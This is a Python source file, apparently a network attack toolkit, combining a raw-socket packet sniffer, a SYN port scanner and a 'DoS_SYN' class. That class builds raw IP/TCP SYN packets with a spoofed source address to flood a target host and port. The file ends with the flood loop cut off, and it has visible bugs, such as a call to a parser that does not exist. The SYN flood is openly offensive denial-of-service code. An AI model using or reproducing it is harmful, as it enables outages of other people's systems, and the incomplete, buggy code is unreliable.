#!/usr/bin/python3
import socket
import asyncio
import struct
import signal
import ctypes
import ssl
import sys
import os
import random
import time
import argparse


class Constant :
    MODULE : bool = __name__ != "__main__"
    ISROOT : bool = os.geteuid() == 0
    TIME : int = round(time.time())
    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
    COUNTER : int = ctypes.c_uint32(0)
    SUP_COLOR : bool = True if os.getenv("COLORTERM") in ("truecolor", "24bit", "color24") and os.getenv("NOCOLOR") in (None, 0, "false", "no") else False
    SLASH : str = chr(47)
    ESCAPE : str = chr(27)
    TOOLS : dict = dict()
    FILES : list = list()
    INFO : str = f"""\n
        [System] : [{sys.platform.upper()}, {time.ctime()}]
        [Hostname] : [{socket.gethostname()}, PID {os.getpid()}]
        [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]
        [GitHub] : [github.com/HI6Cypher]\n\n"""

    def EXIT(code : int) -> None :
        sys.exit(code)
        return

    def SIGNAL(signum : int, stk_frm : "frame") -> None :
        func_name = stk_frm.f_code.co_name
        func_line = str(stk_frm.f_code.co_firstlineno)
        stack_size = str(stk_frm.f_code.co_stacksize)
        EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
        msg = Constant.RED(" **SIGNAL** ")
        msg += "\n\n" + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}"
        for file in Constant.FILES :
            msg += "\n" + f"process_stat : closing file (name : {file.name}, mode : {file.mode})"
            if not file.closed : file.close()
            msg += " " + "closed"
        msg += "\n" + f"process_stat : func {Constant.YELLOW(func_name)} in line {Constant.YELLOW(func_line)} with stacksize {Constant.YELLOW(stack_size)}\n"
        EXCEPTION(msg)
        Constant.EXIT(1)
        return

    def RED(text : str) -> str :
        red = Constant.ESCAPE + "[31m"
        end = Constant.ESCAPE + "[0m"
        return red + text + end if Constant.SUP_COLOR else text

    def GREEN(text : str) -> str :
        green = Constant.ESCAPE + "[32m"
        end = Constant.ESCAPE + "[0m"
        return green + text + end if Constant.SUP_COLOR else text

    def YELLOW(text : str) -> str :
        yellow = Constant.ESCAPE + "[33m"
        end = Constant.ESCAPE + "[0m"
        return yellow + text + end if Constant.SUP_COLOR else text

    def STANDARDIZE_MAC(mac : bytes) -> str :
        return ":".join([f"{sec:02x}" for sec in mac])


class Stack :
    def __init__(self, stack : list) -> "Stack_class" :
        self.__stack = stack

    def stack_is_empty(self) -> bool :
        return True if not self.__stack else False

    def stack_size(self) -> int :
        return len(self.__stack)

    async def stack(self) -> list :
        new_stack = self.__stack[::]
        new_stack.reverse()
        return new_stack

    async def pop(self) -> "any" :
        self.__stack.reverse()
        value = self.__stack.pop()
        self.__stack.reverse()
        return value

    async def add(self, value : "any") -> None :
        self.__stack.append(value)
        return


class Sniff :
    def __init__(self, loop : "async_event_loop", iface : str, tmp : bool, saddr : str, daddr : str, recvbuf : int) -> "Sniff_class" :
        self.loop = loop
        self.iface = iface
        self.tmp = tmp
        self.saddr = saddr
        self.daddr = daddr
        self.__counter = Constant.COUNTER
        self.bufstack = Stack(list())
        self.sock_recvbuf = recvbuf
        self.tmp_file = None

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Sniff : \n\t{self.iface}"

    @property
    def count(self) -> int :
        return self.__counter.value

    @count.setter
    def count(self, value : int) -> None :
        self.__counter.value = value
        return

    @property
    async def stack(self) -> list :
        return await self.bufstack.stack()

    @staticmethod
    async def eth_header(raw_payload : bytes) -> tuple[str, str, str | int] :
        payload = struct.unpack("!6s6sH", raw_payload)
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        dst = standardize_mac_addr(payload[0])
        src = standardize_mac_addr(payload[1])
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6",
            0x0806 : "ARP"
            }
        typ = protos.get(payload[2], payload[2])
        return dst, src, typ

    @staticmethod
    async def ipv4_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, int, int, int, str | int, int, str, str] :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload[:20])
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {
            0x0001 : "ICMPv4",
            0x0006 : "TCP",
            0x0011 : "UDP",
            0x003a : "ICMPv6",
            0x0002 : "IGMP"
            }
        prt = protos.get(payload[6], payload[6])
        csm = payload[7]
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst

    @staticmethod
    async def ipv6_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, str | int, int, str, str] :
        payload = struct.unpack("!lHBB16s16s", raw_payload[:40])
        ver = payload[0] >> 28
        cls = (payload[0] >> 20) & 0xff
        flw = payload[0] & 0xfffff
        pln = payload[1]
        protos = {
            0x0001 : "ICMPv4",
            0x0006 : "TCP",
            0x0011 : "UDP",
            0x003a : "ICMPv6",
            0x0002 : "IGMP"
            }
        prt = protos.get(payload[2], payload[2])
        ttl = payload[3]
        src = socket.inet_ntop(socket.AF_INET6, payload[4])
        dst = socket.inet_ntop(socket.AF_INET6, payload[5])
        return ver, cls, flw, pln, prt, ttl, src, dst

    @staticmethod
    async def arp_header(raw_payload : memoryview | bytes) -> tuple[str | int, str | int, int, int, str | int, str, str, str, str] :
        payload = struct.unpack("!HHBBH6s4s6s4s", raw_payload[:28])
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        hdr = "Ethernet(1)" if payload[0] == 1 else payload[0]
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6"
            }
        prt = protos.get(payload[1], payload[1])
        hln = payload[2]
        pln = payload[3]
        opcodes = {
            0x0001 : "ARP REQ",
            0x0002 : "ARP REP"
            }
        opc = opcodes.get(payload[4], payload[4])
        sha = standardize_mac_addr(payload[5])
        spa = socket.inet_ntop(socket.AF_INET, payload[6])
        tha = standardize_mac_addr(payload[7])
        tpa = socket.inet_ntop(socket.AF_INET, payload[8])
        return hdr, prt, hln, pln, opc, sha, spa, tha, tpa

    @staticmethod
    async def tcp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, dict, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src_p = payload[0]
        dst_p = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 1
        flg = {
            "urg" : urg,
            "ack" : ack,
            "psh" : psh,
            "rst" : rst,
            "syn" : syn,
            "fin" :fin
                }
        win = payload[6]
        csm = payload[7]
        urg = payload[8]
        data = raw_payload[oft:]
        return src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data

    @staticmethod
    async def udp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src_p = payload[0]
        dst_p = payload[1]
        tln = payload[2]
        csm = payload[3]
        data = raw_payload[8:]
        return src_p, dst_p, tln, csm, data

    @staticmethod
    async def icmpv4_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, memoryview | bytes] :
        payload = struct.unpack("!BBH", raw_payload[:4])
        typ = payload[0]
        cod = payload[1]
        csm = payload[2]
        data = raw_payload[8:]
        return typ, cod, csm, data

    @staticmethod
    async def icmpv6_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, memoryview | bytes] :
        payload = struct.unpack("!BBH", raw_payload[:4])
        typ = payload[0]
        cod = payload[1]
        csm = payload[2]
        data = raw_payload[8:]
        return typ, cod, csm, data

    @staticmethod
    async def igmp_header(raw_payload : memoryview | bytes) -> \
        tuple[int, int, int, str] | \
        tuple[int, int, int, str, int, int, int, int, list] | \
        tuple[int, int, int, list[int, int, int, str, list[str], memoryview | bytes]] :
        match raw_payload[0] :
            case 0x12 | 0x16 | 0x17 :
                payload = struct.unpack("!BBH4s", raw_payload[:8])
                typ = payload[0]
                mrt = payload[1]
                csm = payload[2]
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                return typ, mrt, csm, gad
            case 0x11 :
                payload_before_src_addrs = struct.unpack("!BBH4sBBH", raw_payload[:12])
                payload = payload_before_src_addrs
                typ = payload[0]
                mrt = payload[1]
                csm = payload[2]
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                srp = payload[4] >> 3
                qrv = payload[4] & 0b111
                qic = payload[5]
                nos = payload[6]
                payload_after_src_addrs = struct.unpack("!" + nos * "4s", raw_payload[12:12 + nos * 4])
                src_addrs = [socket.inet_ntop(socket.AF_INET, src) for src in payload_after_src_addrs]
                return typ, mrt, csm, gad, srp, qrv, qic, nos, src_addrs
            case 0x22 :
                payload_before_group_records = struct.unpack("!BxHxxH", raw_payload[:8])
                payload = payload_before_group_records
                typ = payload[0]
                csm = payload[1]
                nog = payload[2]
                group_records = list()
                index = 8
                for _ in range(nog) :
                    payload_group_record_before_src_addrs = struct.unpack("!BBH4s", raw_payload[index:index + 8])
                    index += 8
                    payload = payload_group_record_before_src_addrs
                    rtp = payload[0]
                    adl = payload[1]
                    nos = payload[2]
                    mad = socket.inet_ntop(socket.AF_INET, payload[3])
                    payload_group_record_after_src_addrs = struct.unpack("!" + nos * "4s", raw_payload[index:index + nos * 4])
                    index += nos * 4
                    group_record_src_addrs = [socket.inet_ntop(socket.AF_INET, src) for src in payload_group_record_after_src_addrs]
                    data = raw_payload[index:index + adl * 4]
                    index += adl * 4
                    group_records.append((rtp, adl, nos, mad, group_record_src_addrs, data))
                else :
                    return typ, csm, nog, group_records
            case _ :
                payload = struct.unpack("!BBH4s", raw_payload[:8])
                typ = payload[0]
                mrt = payload[1]
                csm = hex(payload[2])
                gad = socket.inet_ntop(socket.AF_INET, payload[3])
                return typ, mrt, csm, gad

    @staticmethod
    async def indent_data(data : memoryview | bytes) -> str :
        data = data.tolist() if isinstance(data, memoryview) else list(data)
        for i in range(len(data)) :
            if data[i] not in range(32, 127) : data[i] = 46
        data.insert(0, 9)
        data.insert(0, 9)
        for i in range((len(data) // 64) + 1) :
            index = (i + 1) * 64
            data.insert(index, 9)
            data.insert(index, 9)
            data.insert(index, 10)
        else :
            data.insert(0, 10)
            data.insert(0, 9)
            data.insert(0, 9)
        return bytes(data).decode()

    async def parse_eth_header(self, data : memoryview | bytes) -> tuple[str, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        dst, src, typ = await self.eth_header(data)
        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
        return parsed_header, typ

    async def parse_ipv4_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = await self.ipv4_header(data)
        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
        parsed_header += f"{t}Checksum : {hex(csm)}  Source : {src}  Destination : {dst}"
        return parsed_header, ihl, prt

    async def parse_ipv6_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        ver, cls, flw, pln, prt, ttl, src, dst = await self.ipv6_header(data)
        parsed_header += f"IPv6 Datagram :{t}Version : {ver}  Traffic Class : {cls}  Flow Lable : {flw}"
        parsed_header += f"{t}Payload Length : {pln}  Next Header : {prt}  Hop Limit : {ttl}"
        parsed_header += f"{t}Source : {src}"
        parsed_header += f"{t}Destination : {dst}"
        return parsed_header, pln, prt

    async def parse_arp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        hdr, prt, hln, pln, opc, sha, spa, tha, tpa = await self.arp_header(data)
        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {prt}{t}Hardware Length : {hln}"
        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
        parsed_header += f"{t}Target Protocol Address : {tpa}"
        return parsed_header

    async def parse_tcp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src_p, dst_p, seq, acn, oft, flg, win, csm, urg, data = await self.tcp_header(data)
        data = await self.indent_data(data)
        parsed_header += f"TCP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
        parsed_header += f"Window : {win}{t}Checksum : {hex(csm)}{t}Urgent Pointer : {urg}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_udp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src_p, dst_p, tln, csm, data = await self.udp_header(data)
        data = await self.indent_data(data)
        parsed_header += f"UDP Segment :{t}Source Port : {src_p}{t}Destination Port : {dst_p}{t}Length : {tln}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_icmpv4_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, data = await self.icmpv4_header(data)
        data = await self.indent_data(data)
        parsed_header += f"ICMPv4 Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_icmpv6_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, data = await self.icmpv4_header(data)
        data = await self.indent_data(data)
        parsed_header += f"ICMPv6 Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {hex(csm)}{t}Raw Data :\n{data}"
        return parsed_header

    async def parse_igmp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"

        async def handle_codes(code : int) -> int :
            if code < 128 :
                encoded = code
            if code >= 128 :
                exp = (code >> 4) & 0b111
                mant = code & 0b1111
                encoded = (mant | 0x10) << (exp + 3)
            return encoded

        parsed_igmp_header = await self.igmp_header(data)
        match parsed_igmp_header[0] :
            case 0x12 | 0x16 | 0x17 :
                typ, mrt, csm, gad = parsed_igmp_header
                igmp_types = {
                    0x12 : "IGMPv1 Memship Report",
                    0x16 : "IGMPv2 Memship Report",
                    0x17 : "IGMPv2 Leave Group"
                    }
                parsed_header += f"{igmp_types[typ]} Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Group Address : {gad}"
                return parsed_header
            case 0x11 :
                typ, mrt, csm, gad, srp, qrv, qic, nos, src_addrs = parsed_igmp_header
                parsed_header += f"IGMP Memship Query Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Group Address : {gad}{t}S-Flag : {srp}{t}QRV : {qrv}{t}Checksum : {hex(csm)}{t}"
                parsed_header += f"QQI : {await handle_codes(qic)}{t}Number of Sources : {nos}{t}Source Addresses{t}\t"
                parsed_header += (t + "\t").join(src_addrs)
                return parsed_header
            case 0x22 :
                typ, csm, nog, group_records = parsed_igmp_header
                parsed_header += f"IGMPv3 Memship Report Datagram :{t}Type : {hex(typ)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Number of Group Records : {nog}{t}Group Records :{t}\t"
                record_types = {
                    1 : "MODE_IS_INCLUDE",
                    2 : "MODE_IS_EXCLUDE",
                    3 : "CHANGE_TO_INCLUDE_MODE",
                    4 : "CHANGE_TO_EXCLUDE_MODE",
                    5 : "ALLOW_NEW_SOURCES",
                    6 : "BLOCK_OLD_SOURCES"
                    }
                for index, group in enumerate(group_records) :
                    rtp, adl, nos, mad, src_addrs, data = group
                    parsed_header += f"Group_record[{index}] :{t}\t\tRecord Type : {record_types[rtp]}[{rtp}]{t}\t\tAux Data Length : {adl}{t}\t\t"
                    parsed_header += f"Number of Sources : {nos}{t}\t\tMulticast Address : {mad}{t}\t\tSource Addresses :{t}\t\t\t"
                    parsed_header += (t + "\t\t\t").join(src_addrs)
                    parsed_header += f"{t}\t\tData : {t}\t\t\t{await self.indent_data(data)}"
                    parsed_header += t + "\t"
                else : return parsed_header

            case _ :
                typ, mrt, csm, gad = parsed_igmp_header
                parsed_header += f"IGMP Unkown Datagram :{t}Type : {hex(typ)}{t}Max Response Time : {await handle_codes(mrt)}{t}"
                parsed_header += f"Checksum : {hex(csm)}{t}Group Address : {gad}"
                return parsed_header

    async def parse_headers(self, raw_data : memoryview | bytes) -> str :
        parsed_headers = str()
        spec_header = f"[{self.count}][DATALINK_FRAME]________________{Constant.TIME}________________"
        self.count += 1
        eth_data = raw_data[:14]
        parsed_eth_header, typ = await self.parse_eth_header(eth_data)
        match typ :
            case "IPv4" :
                ip_data = raw_data[14:]
                parsed_ip_header, ihl, prt = await self.parse_ipv4_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_udp_header(udp_data)
                    case "ICMPv4" :
                        icmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_icmpv4_header(icmp_data)
                    case "ICMPv6" :
                        icmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_icmpv6_header(icmp_data)
                    case "IGMPv2" :
                        igmp_data = raw_data[14 + ihl:]
                        next_layer_header = await self.parse_igmpv2_header(igmp_data)
                    case _ :
                        next_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_ip_header
                parsed_headers += "\n\n"
                parsed_headers += next_layer_header
                parsed_headers += "\n\n"
                return parsed_headers
            case "IPv6" :
                ip_data = raw_data[14:]
                parsed_ip_header, pln, prt = await self.parse_ipv6_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_udp_header(udp_data)
                    case "ICMPv4" :
                        icmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_icmpv4_header(icmp_data)
                    case "ICMPv6" :
                        icmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_icmpv6_header(icmp_data)
                    case "IGMPv2" :
                        igmp_data = raw_data[14 + 40:]
                        next_layer_header = await self.parse_igmpv2_header(igmp_data)
                    case _ :
                        next_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_ip_header
                parsed_headers += "\n\n"
                parsed_headers += next_layer_header
                parsed_headers += "\n\n"
                return parsed_headers
            case "ARP" :
                arp_data = raw_data[14:]
                parsed_arp_header = await self.parse_arp_header(arp_data)
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_arp_header
                parsed_headers += "\n\n"
                return parsed_headers
            case _ :
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += f"{typ} : unimplemented network layer protocol"
                parsed_headers += "\n\n"
                return parsed_headers

    async def check_interface(self) -> None :
        ifaces = [iface[-1] for iface in socket.if_nameindex()]
        if self.iface not in ifaces :
            raise OSError(f"{self.iface} not in {ifaces}")
        self.iface = self.iface.encode()
        return

    async def check_ip(self, frame : memoryview | bytes) -> bool :
        typ = bytes(frame[12:14]).hex()
        return typ == "0800"

    async def check_saddr_ip(self, frame : memoryview | bytes) -> bool :
        src = ".".join((str(i) for i in tuple(frame[14:][12:16])))
        return src == self.saddr

    async def check_daddr_ip(self, frame : memoryview | bytes) -> bool :
        dst = ".".join((str(i) for i in tuple(frame[14:][16:20])))
        return dst == self.daddr

    async def check_eth_p_all(self) -> None :
        if "ETH_P_ALL" not in socket.__all__ :
            socket.ETH_P_ALL = 3
        return

    async def filter(self, frame : memoryview | bytes) -> bool :
            nonce = 0
            if not (self.saddr or self.daddr) :
                return True
            if not await self.check_ip(frame) :
                return False
            if self.saddr :
                nonce += 1 if await self.check_saddr_ip(frame) else -1
            if self.daddr :
                nonce += 1 if await self.check_daddr_ip(frame) else -1
            if nonce > 0 :
                return True
            else : return False

    async def outputctl(self) -> None :
        if not self.bufstack.stack_is_empty() :
            frame = await self.bufstack.pop()
            filter = await self.filter(frame)
            if filter :
                parsed_header = await self.parse_headers(frame)
                parsed_header = parsed_header.expandtabs(4)
                if self.tmp :
                    await asyncio.to_thread(self.write, parsed_header)
                await asyncio.to_thread(print, parsed_header)
        return

    def write(self, data : str) -> None :
        self.tmp_file.write(data)
        return

    async def create_file(self) -> "file" :
        path = f"data_{Constant.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        file = open(path, mode)
        Constant.FILES.append(file)
        return file

    async def add_to_stack(self, value : memoryview | bytes) -> None :
        await self.bufstack.add(value)
        return

    async def sniff(self) -> None :
        await self.check_interface()
        await self.check_eth_p_all()
        if self.tmp :
            async_file = await self.create_file()
            self.tmp_file = async_file
        await asyncio.gather(asyncio.create_task(self.__sniff()))
        return

    async def __sniff(self) -> None :
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as sniff :
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, self.sock_recvbuf)
            while True :
                raw_data = await self.loop.sock_recvfrom(sniff, 65535)
                raw_data_memview = memoryview(raw_data[0])
                if raw_data : await self.add_to_stack(raw_data_memview)
                await self.outputctl()
            return


class Scan :
    def __init__(self, source : str, host : str, timeout : int, event_loop : "async_event_loop") -> "Scan_class" :
        self.source = source
        self.host = host
        self.timeout = timeout
        self.loop = event_loop
        self.ipv4_static_header = self.ipv4_header()
        self.opens = list()
        self.unspecified = list()

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Scan : \n\t{self.host}\n\t{self.port}\n\t{self.timeout}"

    @staticmethod
    def is_open_port(tcp_header : bytes) -> bool :
         flags = tcp_header[13:14]
         ack_syn = bytes(flags).hex() == "12"
         return True if ack_syn else False

    @staticmethod
    def check_acknum(acn : int, tcp_header : bytes) -> bool :
        acknum_byte = tcp_header[8:12]
        return True if int(bytes(acknum_byte).hex(), base = 16) - 1 == acn else False

    @staticmethod
    def ip_header(src : str, dst : str, idn : int = 0, csm : int = 0) -> bytes :
        return DoS_SYN.ip_header(src = src, dst = dst, idn = idn, csm = csm)

    @staticmethod
    def tcp_header(src_p : int = 0, dst_p : int = 0, seq : int = 0, syn = 0, csm : int = 0) -> bytes :
        return DoS_SYN.tcp_header(src_p = src_p, dst_p = dst_p, seq = seq, syn = 1, csm = csm)

    @staticmethod
    def pseudo_header(src : str, dst : str, pln : int = 0) -> bytes :
        return DoS_SYN.pseudo_header(src = src, dst = dst, pln = pln)

    @staticmethod
    def checksum(data : bytes) -> int :
        return DoS_SYN.checksum(data)

    def ipv4_header(self) -> bytes :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = random.randint(1024, 65535)
        header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum_ip_header = self.checksum(header)
        header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum_ip_header)
        return header

    def tcpip_header(self, port : int) -> tuple[bytes, int] :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        src_p = random.randint(1024, 65535)
        dst_p = port
        randseq = random.randint(0, 65535)
        header = self.tcp_header(src_p = src_p, dst_p = dst_p, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(header))
        checksum_tcp_header = self.checksum(header + pseudo_header)
        header = self.tcp_header(src_p = src_p, dst_p = dst_p, seq = randseq, syn = 1, csm = checksum_tcp_header)
        return header, randseq

    async def package(self, port : int) -> tuple[bytes, int] :
        ip_header = self.ipv4_static_header
        tcp_header = self.tcpip_header(port)
        payload = ip_header + tcp_header[0]
        return payload, tcp_header[1]

    async def send(self, port : int) -> tuple[bool, bytes | None] :
        try :
            payload = await self.package(port)
            async with asyncio.timeout(self.timeout) :
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as scan :
                    scan.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    scan.settimeout(self.timeout)
                    scan.setblocking(False)
                    await self.loop.sock_sendto(scan, payload[0], (self.host, port))
                    while True :
                        rsp = await self.loop.sock_recv(scan, 1024)
                        if self.check_acknum(payload[1], rsp[20:]) :
                            return True, rsp
        except asyncio.TimeoutError :
            return False, None
        except socket.timeout :
            return False, None

    async def scan(self, port : int) -> tuple[bool, bool] :
        return await self.__scan(port)

    async def __scan(self, port : int) -> tuple[bool, bool] :
        status, response = await self.send(port)
        if status :
            tcp_header = response[20:]
            is_open = self.is_open_port(tcp_header)
            if is_open :
                self.opens.append(port)
                return True, True
            else :
                return False, True
        else :
            self.unspecified.append(port)
            return False, False


class DoS_SYN :
    def __init__(self, host: str, port : int, rate : int) -> "DoS_SYN_class" :
        self.host = host
        self.port = int(port)
        self.rate = rate
        self.__counter = Constant.COUNTER

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"

    @property
    def count(self) -> int :
        return self.__counter.value

    @count.setter
    def count(self, value : int) -> None :
        self.__counter.value = value
        return

    @staticmethod
    def ip_header(src : str, dst : str,
        ver : int = 4, ihl : int = 5,
        tos : int = 0, tln : int = 40,
        idn : int = 0, flg : int = 0,
        oft : int = 0, ttl : int = 255,
        prt : int = socket.IPPROTO_TCP, csm : int = 0) -> bytes :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn, flg_oft, ttl, prt, csm, src, dst)
        return datagram

    @staticmethod
    def tcp_header(src_p : int = 0, dst_p : int = 0,
        seq : int = 0, acn : int = 0,
        oft : int = 5, urg : int = 0,
        ack : int = 0, psh : int = 0,
        rst : int = 0, syn : int = 0,
        fin : int = 0, win : int = 65535,
        csm : int = 0, urp : int = 0) -> bytes :
        oft <<= 12
        res = 0 << 6
        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        oft_res_flg = oft + res + flg
        segment = struct.pack("!HHLLHHHH", src_p, dst_p, seq, acn, oft_res_flg, win, csm, urp)
        return segment

    @staticmethod
    def pseudo_header(src : str, dst : str,
        res : int = 0, prt : int = socket.IPPROTO_TCP,
        pln : int = 0) -> bytes :
        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
        return segment

    @staticmethod
    def checksum(data : bytes) -> int :
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 65535)
        checksum = (~ checksum) & 65535
        return checksum

    @staticmethod
    def random_ip() -> str :
        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    @staticmethod
    def progress_bar(x : int, y : int) -> str :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    def package(self) -> bytes :
        randip = self.random_ip()
        randnum = lambda x, y : random.randint(x, y)
        src = socket.inet_pton(socket.AF_INET, "192.168.129.207")
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = randnum(0, 65535)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
        randseq = randnum(0, 65535)
        randsrp = randnum(1024, 65535)
        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(src_p = randsrp, dst_p = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self) -> None :
        self.__flood()
        return

    def __flood(self) -> None :
        while self.count != self.rate :
            payload = self.package()
